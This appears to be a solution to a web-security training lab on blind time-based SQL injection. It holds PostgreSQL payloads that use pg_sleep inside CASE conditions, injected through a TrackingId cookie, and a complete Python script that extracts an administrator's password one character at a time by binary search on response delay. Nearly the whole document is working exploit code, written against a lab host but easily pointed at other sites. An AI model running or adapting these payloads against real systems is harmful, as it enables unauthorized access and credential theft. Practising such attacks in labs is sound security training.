```bash
' || CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END --  // worked

' || CASE WHEN (length((select password from users where username = 'administrator')) = 20) THEN pg_sleep(4) ELSE pg_sleep(0) END --

TrackingId=x';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>20) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--  // alternative

TrackingId=x';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--


#!/usr/bin/env python3

from __future__ import annotations

import time
import requests
from typing import Final

TARGET_URL: Final[str] = (
    "https://0a9900df03c968f880d5db900020008c.web-security-academy.net/"
)
SESSION_COOKIE: Final[str] = "wp1sNiVCSw3LmzPjEhPQdnf4RFHTEvBX"

DELAY: Final[int] = 2  # seconds used in pg_sleep
THRESHOLD: Final[float] = 4.0  # response delay threshold
PASSWORD_LENGTH: Final[int] = 20

session = requests.Session()
session.cookies.set("session", SESSION_COOKIE)


def send_payload(payload: str) -> float:
    """Send payload and return response time."""
    session.cookies.set("TrackingId", payload)

    start = time.perf_counter()
    session.get(TARGET_URL)
    end = time.perf_counter()

    return end - start


def is_true(condition_sql: str) -> bool:
    """Return True if condition causes a time delay."""
    payload = (
        f"x'||CASE WHEN ({condition_sql}) THEN pg_sleep({DELAY}) ELSE pg_sleep(0) END--"
    )

    response_time = send_payload(payload)
    return response_time > THRESHOLD


def extract_char(position: int) -> str:
    """Extract a single character using binary search."""
    low, high = 32, 126

    while low <= high:
        mid = (low + high) // 2

        condition = (
            "ASCII(SUBSTRING("
            "(SELECT password FROM users WHERE username='administrator'),"
            f"{position},1))>{mid}"
        )

        if is_true(condition):
            low = mid + 1
        else:
            high = mid - 1

    return chr(low)


def extract_password() -> str:
    """Extract full administrator password."""
    password = ""
    print("[*] Extracting administrator password...\n")

    for position in range(1, PASSWORD_LENGTH + 1):
        char = extract_char(position)
        password += char
        print(f"[+] Position {position:02d}: {char} → {password}")

    return password


def main() -> None:
    password = extract_password()
    print("\n[✔] Administrator password:", password)


if __name__ == "__main__":
    main()
```
